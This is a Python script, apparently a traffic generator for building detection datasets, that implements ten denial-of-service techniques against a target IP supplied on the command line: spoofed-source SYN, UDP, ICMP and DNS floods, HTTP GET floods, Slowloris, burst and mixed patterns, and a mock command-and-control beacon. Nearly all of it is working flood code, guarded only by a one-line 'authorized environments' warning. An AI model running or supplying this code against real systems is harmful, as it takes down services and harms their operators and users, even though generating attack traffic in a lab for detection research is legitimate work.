# botnet_attack.py
import socket
import threading
import time
import random
import string
import json
from datetime import datetime
from scapy.all import *
import struct

# ======== CONFIG ========
TARGET_IP = "192.168.17.138"
TARGET_PORTS = [80, 443, 8080, 3306, 21, 22, 25, 53]
LOG_FILE = "botnet_timeline.json"

class BotnetAttackGenerator:
    """Botnet Attack Generator with Multiple Techniques"""
    
    def __init__(self, target_ip, target_ports):
        self.target_ip = target_ip
        self.target_ports = target_ports
        self.attacks = []
        self.packets_sent = 0
        self.connections_made = 0
        self.bytes_sent = 0
        self.bots_active = 0
        self.stop_attack = False
    
    def log_attack_start(self, attack_type, description):
        """تسجيل بداية الهجوم"""
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_ports": self.target_ports,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Description: {description}")
        print(f"[+] Target: {self.target_ip}")
        print(f"[+] Ports: {self.target_ports}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.packets_sent = 0
        self.connections_made = 0
        self.bytes_sent = 0
    
    def log_attack_end(self):
        """تسجيل نهاية الهجوم"""
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['packets_sent'] = self.packets_sent
        self.current_attack['connections_made'] = self.connections_made
        self.current_attack['bytes_sent'] = self.bytes_sent
        self.current_attack['bots_simulated'] = self.bots_active
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Packets: {self.packets_sent}")
        print(f"[✓] Connections: {self.connections_made}")
        print(f"[✓] Bytes: {self.bytes_sent}")
        print(f"[✓] Bots: {self.bots_active}\n")
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")
        self.print_summary()
    
    def print_summary(self):
        """طباعة ملخص"""
        print("\n" + "="*60)
        print("BOTNET ATTACK SUMMARY")
        print("="*60)
        
        total_packets = 0
        total_connections = 0
        
        for i, attack in enumerate(self.attacks, 1):
            print(f"\n#{i} - {attack['attack_type']}")
            print(f"   Duration: {attack['duration_seconds']}s")
            print(f"   Packets: {attack['packets_sent']}")
            print(f"   Connections: {attack['connections_made']}")
            print(f"   Bots: {attack['bots_simulated']}")
            
            total_packets += attack['packets_sent']
            total_connections += attack['connections_made']
        
        print("\n" + "="*60)
        print(f"Total attacks: {len(self.attacks)}")
        print(f"Total packets: {total_packets}")
        print(f"Total connections: {total_connections}")
        print("="*60)


# ======== Helper Functions ========

def random_ip():
    """توليد IP عشوائي (تمثيل البوتات)"""
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def random_user_agent():
    """توليد User-Agent عشوائي"""
    browsers = [
        f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(0, 999)}',
        f'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_{random.randint(0, 7)}) Safari/{random.randint(600, 620)}.{random.randint(1, 9)}',
        f'Mozilla/5.0 (X11; Linux x86_64) Firefox/{random.randint(80, 110)}.0',
        f'Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14, 17)}_{random.randint(0, 5)} like Mac OS X)',
        f'BotNet/{random.randint(1, 9)}.{random.randint(0, 9)}',
    ]
    return random.choice(browsers)


def random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))


# ======== 1. Distributed SYN Flood ========
def botnet_syn_flood(attacker, duration=30, bots=100):
    """SYN Flood من بوتات متعددة"""
    attacker.log_attack_start("BOTNET_SYN_FLOOD", "Distributed SYN flood from multiple bots")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot واحد"""
        bot_ip = random_ip()
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            try:
                port = random.choice(attacker.target_ports)
                
                # SYN packet من IP البوت
                pkt = IP(src=bot_ip, dst=attacker.target_ip)/TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags="S",
                    seq=random.randint(0, 4294967295)
                )
                
                send(pkt, verbose=False)
                attacker.packets_sent += 1
                
            except:
                pass
            
            # تأخير عشوائي صغير
            time.sleep(random.uniform(0.001, 0.01))
    
    print(f"  [*] Launching {bots} bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 2. HTTP GET Flood from Bots ========
def botnet_http_get_flood(attacker, duration=30, bots=50):
    """HTTP GET flood من بوتات متعددة"""
    attacker.log_attack_start("BOTNET_HTTP_GET", "Distributed HTTP GET flood")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot واحد"""
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            try:
                port = random.choice([80, 8080, 443])
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((attacker.target_ip, port))
                
                attacker.connections_made += 1
                
                # HTTP GET request مع headers عشوائية
                path = '/' + random_string(random.randint(5, 15))
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {attacker.target_ip}\r\n"
                request += f"User-Agent: {random_user_agent()}\r\n"
                request += f"Accept: */*\r\n"
                request += f"Connection: close\r\n"
                request += f"X-Bot-ID: {bot_id}\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                attacker.packets_sent += 1
                attacker.bytes_sent += len(request)
                
                sock.close()
                
            except:
                pass
            
            time.sleep(random.uniform(0.1, 0.5))
    
    print(f"  [*] Launching {bots} HTTP bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 3. UDP Amplification Attack ========
def botnet_udp_amplification(attacker, duration=30, bots=80):
    """UDP Amplification من بوتات مختلفة"""
    attacker.log_attack_start("BOTNET_UDP_AMP", "UDP amplification attack")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot واحد"""
        bot_ip = random_ip()
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            try:
                port = random.choice([53, 123, 161, 1900])  # DNS, NTP, SNMP, SSDP
                
                # UDP packet كبير
                payload = random_string(random.randint(512, 1400))
                
                pkt = IP(src=bot_ip, dst=attacker.target_ip)/UDP(
                    sport=random.randint(1024, 65535),
                    dport=port
                )/Raw(load=payload.encode())
                
                send(pkt, verbose=False)
                attacker.packets_sent += 1
                attacker.bytes_sent += len(payload)
                
            except:
                pass
            
            time.sleep(random.uniform(0.01, 0.05))
    
    print(f"  [*] Launching {bots} UDP bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 4. ICMP Flood ========
def botnet_icmp_flood(attacker, duration=30, bots=60):
    """ICMP flood من بوتات متعددة"""
    attacker.log_attack_start("BOTNET_ICMP_FLOOD", "Distributed ICMP flood")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot واحد"""
        bot_ip = random_ip()
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            try:
                # ICMP packet
                payload = random_string(random.randint(32, 1024))
                
                pkt = IP(src=bot_ip, dst=attacker.target_ip)/ICMP(
                    type=8,  # Echo request
                    id=random.randint(0, 65535)
                )/Raw(load=payload.encode())
                
                send(pkt, verbose=False)
                attacker.packets_sent += 1
                
            except:
                pass
            
            time.sleep(random.uniform(0.005, 0.02))
    
    print(f"  [*] Launching {bots} ICMP bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 5. Slowloris from Multiple Bots ========
def botnet_slowloris(attacker, duration=60, bots=40):
    """Slowloris من بوتات متعددة"""
    attacker.log_attack_start("BOTNET_SLOWLORIS", "Distributed Slowloris attack")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot واحد"""
        
        sockets_list = []
        
        # إنشاء اتصالات
        for _ in range(random.randint(3, 10)):
            try:
                port = random.choice([80, 8080, 443])
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((attacker.target_ip, port))
                
                # بداية HTTP request
                sock.send(f"GET /{random_string(10)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {attacker.target_ip}\r\n".encode())
                sock.send(f"User-Agent: Bot-{bot_id}\r\n".encode())
                
                sockets_list.append(sock)
                attacker.connections_made += 1
                
            except:
                pass
        
        # إبقاء الاتصالات حية
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            for sock in list(sockets_list):
                try:
                    sock.send(f"X-{random_string(5)}: {random_string(10)}\r\n".encode())
                    attacker.packets_sent += 1
                except:
                    sockets_list.remove(sock)
            
            time.sleep(random.uniform(10, 15))
        
        # إغلاق
        for sock in sockets_list:
            try:
                sock.close()
            except:
                pass
    
    print(f"  [*] Launching {bots} Slowloris bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 6. DNS Amplification ========
def botnet_dns_amplification(attacker, duration=30, bots=70):
    """DNS Amplification attack"""
    attacker.log_attack_start("BOTNET_DNS_AMP", "DNS amplification from bots")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot واحد"""
        bot_ip = random_ip()
        
        # DNS queries كبيرة
        dns_queries = [
            'google.com',
            'facebook.com',
            'youtube.com',
            random_string(50) + '.com',
        ]
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            try:
                domain = random.choice(dns_queries)
                
                # DNS query packet
                pkt = IP(src=bot_ip, dst=attacker.target_ip)/UDP(
                    sport=random.randint(1024, 65535),
                    dport=53
                )/DNS(
                    rd=1,
                    qd=DNSQR(qname=domain, qtype='ANY')
                )
                
                send(pkt, verbose=False)
                attacker.packets_sent += 1
                
            except:
                pass
            
            time.sleep(random.uniform(0.01, 0.03))
    
    print(f"  [*] Launching {bots} DNS bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 7. Multi-Protocol Attack ========
def botnet_multi_protocol(attacker, duration=30, bots=100):
    """هجوم متعدد البروتوكولات"""
    attacker.log_attack_start("BOTNET_MULTI_PROTOCOL", "Multi-protocol distributed attack")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot واحد - بروتوكول عشوائي"""
        bot_ip = random_ip()
        
        protocols = ['tcp_syn', 'udp', 'icmp', 'http']
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            try:
                protocol = random.choice(protocols)
                port = random.choice(attacker.target_ports)
                
                if protocol == 'tcp_syn':
                    pkt = IP(src=bot_ip, dst=attacker.target_ip)/TCP(
                        sport=random.randint(1024, 65535),
                        dport=port,
                        flags="S"
                    )
                    send(pkt, verbose=False)
                
                elif protocol == 'udp':
                    pkt = IP(src=bot_ip, dst=attacker.target_ip)/UDP(
                        sport=random.randint(1024, 65535),
                        dport=port
                    )/Raw(load=random_string(512).encode())
                    send(pkt, verbose=False)
                
                elif protocol == 'icmp':
                    pkt = IP(src=bot_ip, dst=attacker.target_ip)/ICMP()/Raw(
                        load=random_string(64).encode()
                    )
                    send(pkt, verbose=False)
                
                elif protocol == 'http':
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect((attacker.target_ip, port))
                        sock.send(f"GET / HTTP/1.1\r\nHost: {attacker.target_ip}\r\n\r\n".encode())
                        sock.close()
                        attacker.connections_made += 1
                    except:
                        pass
                
                attacker.packets_sent += 1
                
            except:
                pass
            
            time.sleep(random.uniform(0.005, 0.02))
    
    print(f"  [*] Launching {bots} multi-protocol bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 8. Randomized Attack Pattern ========
def botnet_random_pattern(attacker, duration=30, bots=80):
    """نمط هجوم عشوائي تماماً"""
    attacker.log_attack_start("BOTNET_RANDOM", "Randomized attack pattern")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot بسلوك عشوائي تماماً"""
        bot_ip = random_ip()
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            try:
                # اختيار عشوائي
                attack_type = random.choice(['syn', 'ack', 'fin', 'udp', 'icmp', 'http'])
                port = random.choice(attacker.target_ports)
                
                if attack_type in ['syn', 'ack', 'fin']:
                    flags = {'syn': 'S', 'ack': 'A', 'fin': 'F'}[attack_type]
                    pkt = IP(src=bot_ip, dst=attacker.target_ip)/TCP(
                        sport=random.randint(1024, 65535),
                        dport=port,
                        flags=flags
                    )
                    send(pkt, verbose=False)
                
                elif attack_type == 'udp':
                    pkt = IP(src=bot_ip, dst=attacker.target_ip)/UDP(
                        dport=port
                    )/Raw(load=random_string(random.randint(64, 512)).encode())
                    send(pkt, verbose=False)
                
                elif attack_type == 'icmp':
                    pkt = IP(src=bot_ip, dst=attacker.target_ip)/ICMP()
                    send(pkt, verbose=False)
                
                elif attack_type == 'http':
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((attacker.target_ip, port))
                        sock.send(b"GET / HTTP/1.1\r\n\r\n")
                        sock.close()
                    except:
                        pass
                
                attacker.packets_sent += 1
                
            except:
                pass
            
            # delay عشوائي تماماً
            time.sleep(random.uniform(0.001, 0.1))
    
    print(f"  [*] Launching {bots} random bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 9. Burst Attack Pattern ========
def botnet_burst_pattern(attacker, duration=60, bots=50):
    """هجوم على شكل bursts"""
    attacker.log_attack_start("BOTNET_BURST", "Burst pattern attack")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot بنمط bursts"""
        bot_ip = random_ip()
        
        end_time = time.time() + duration
        
        while time.time() < end_time and not attacker.stop_attack:
            # Burst: إرسال سريع
            burst_size = random.randint(10, 50)
            
            for _ in range(burst_size):
                try:
                    port = random.choice(attacker.target_ports)
                    
                    pkt = IP(src=bot_ip, dst=attacker.target_ip)/TCP(
                        sport=random.randint(1024, 65535),
                        dport=port,
                        flags=random.choice(['S', 'A', 'F'])
                    )
                    
                    send(pkt, verbose=False)
                    attacker.packets_sent += 1
                    
                except:
                    pass
            
            # فترة هدوء
            time.sleep(random.uniform(5, 15))
    
    print(f"  [*] Launching {bots} burst bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== 10. Command & Control Simulation ========
def botnet_c2_simulation(attacker, duration=30, bots=30):
    """محاكاة C&C communication"""
    attacker.log_attack_start("BOTNET_C2", "C&C communication simulation")
    
    attacker.bots_active = bots
    
    def bot_worker(bot_id):
        """عمل bot مع C&C communication"""
        bot_ip = random_ip()
        
        end_time = time.time() + duration
        
        # محاكاة C&C traffic
        while time.time() < end_time and not attacker.stop_attack:
            try:
                # Beacon للـ C&C
                c2_port = random.choice([443, 8080, 9001])
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((attacker.target_ip, c2_port))
                
                # إرسال beacon
                beacon = f"BOT_{bot_id}_STATUS:ACTIVE_{random_string(16)}"
                sock.send(beacon.encode())
                
                sock.close()
                attacker.connections_made += 1
                
            except:
                pass
            
            # ثم هجوم
            try:
                port = random.choice(attacker.target_ports)
                
                pkt = IP(src=bot_ip, dst=attacker.target_ip)/TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags="S"
                )
                send(pkt, verbose=False)
                attacker.packets_sent += 1
                
            except:
                pass
            
            # C&C communication interval
            time.sleep(random.uniform(3, 8))
    
    print(f"  [*] Launching {bots} C&C bots...")
    
    threads = []
    for i in range(bots):
        t = threading.Thread(target=bot_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)
    
    attacker.log_attack_end()


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Botnet Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--ports', default='80,443,8080,22,21,25,53,3306',
                       help='Target ports (comma-separated)')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='Attack duration per type (seconds)')
    parser.add_argument('-a', '--attack',
                       choices=['syn', 'http', 'udp', 'icmp', 'slowloris', 
                               'dns', 'multi', 'random', 'burst', 'c2', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
    target_ports = [int(p.strip()) for p in args.ports.split(',')]
    
    print("\n" + "="*60)
    print("BOTNET ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {args.target}")
    print(f"Ports: {target_ports}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration}s per attack")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: Botnet simulation - Use only in authorized environments!\n")
    
    input("Press ENTER to start...")
    
    attacker = BotnetAttackGenerator(args.target, target_ports)
    
    try:
        if args.attack == 'syn':
            botnet_syn_flood(attacker, args.duration)
        elif args.attack == 'http':
            botnet_http_get_flood(attacker, args.duration)
        elif args.attack == 'udp':
            botnet_udp_amplification(attacker, args.duration)
        elif args.attack == 'icmp':
            botnet_icmp_flood(attacker, args.duration)
        elif args.attack == 'slowloris':
            botnet_slowloris(attacker, args.duration)
        elif args.attack == 'dns':
            botnet_dns_amplification(attacker, args.duration)
        elif args.attack == 'multi':
            botnet_multi_protocol(attacker, args.duration)
        elif args.attack == 'random':
            botnet_random_pattern(attacker, args.duration)
        elif args.attack == 'burst':
            botnet_burst_pattern(attacker, args.duration)
        elif args.attack == 'c2':
            botnet_c2_simulation(attacker, args.duration)
        elif args.attack == 'all':
            attacks = [
                ('SYN Flood', botnet_syn_flood, 30),
                ('HTTP GET Flood', botnet_http_get_flood, 30),
                ('UDP Amplification', botnet_udp_amplification, 30),
                ('ICMP Flood', botnet_icmp_flood, 30),
                ('Slowloris', botnet_slowloris, 40),
                ('DNS Amplification', botnet_dns_amplification, 30),
                ('Multi-Protocol', botnet_multi_protocol, 30),
                ('Random Pattern', botnet_random_pattern, 30),
                ('Burst Pattern', botnet_burst_pattern, 40),
                ('C&C Simulation', botnet_c2_simulation, 30),
            ]
            
            for name, attack_func, dur in attacks:
                print(f"\n>>> Starting {name} <<<")
                attack_func(attacker, dur)
                print(f"\n[*] Waiting 10 seconds...\n")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()


if __name__ == "__main__":
    main()
